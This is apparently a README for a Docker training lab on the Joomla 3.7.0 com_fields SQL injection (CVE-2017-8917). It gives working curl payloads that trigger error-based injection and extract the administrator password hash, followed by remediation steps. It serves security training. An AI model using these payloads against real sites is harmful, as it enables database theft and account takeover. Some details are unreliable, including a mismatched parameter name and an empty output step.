# Joomla Core com_fields SQL Injection (CVE-2017-8917)

## Overview

Joomla! is a widely deployed open-source content management system. In Joomla version 3.7.0, a newly introduced component com_fields allowed public unauthenticated users to execute arbitrary SQL queries against the underlying database. The vulnerability arises from lack of input filtering in the listorder parameter processed by the administrative view, enabling error-based or UNION-based SQL extraction of administrative password hashes and session tokens.

- **Service Access**: `http://localhost:8156/`
- **Default Credentials**: `Unauthenticated SQL injection`
- **Docker Shortcut**: `./lab start joomla-sqli`
- **Container Name**: `cyberlab_02_joomla_sqli_rce`
- **RAM Footprint**: ~200M

---

## Exploitation Walkthrough

### 1. Trigger Error-Based SQL Injection

```bash
curl 'http://localhost:8156/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,user(),0x7e),1)'
```

### 2. Extract Administrator Hash

```bash
curl 'http://localhost:8156/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT+password+FROM+%23__users+LIMIT+0,1),FLOOR(RAND(0)*2))+x+FROM+information_schema.tables+GROUP+BY+x)a)'
```

### 3. Verify Output

```bash
# Output demonstrates database username extraction and error disclosure.
```

---

## Defensive Remediation & Hardening

1. Upgrade Joomla to version 3.7.1 or higher.
2. Implement parameterized database queries across all custom components.
3. Deploy Web Application Firewalls (WAF) to detect nested SQL keywords in query strings.

---

## Video Walkthroughs & Technical References

- [Sqli Labs Master Lesson 1 Get Error Based Solution](https://www.youtube.com/watch?v=HtdGLZOuXXA)
- [Joomla Security Announcement CVE-2017-8917](https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html)
- [Vulhub Joomla CVE-2017-8917 Environment](https://vulhub.org/#/environments/joomla/CVE-2017-8917/)
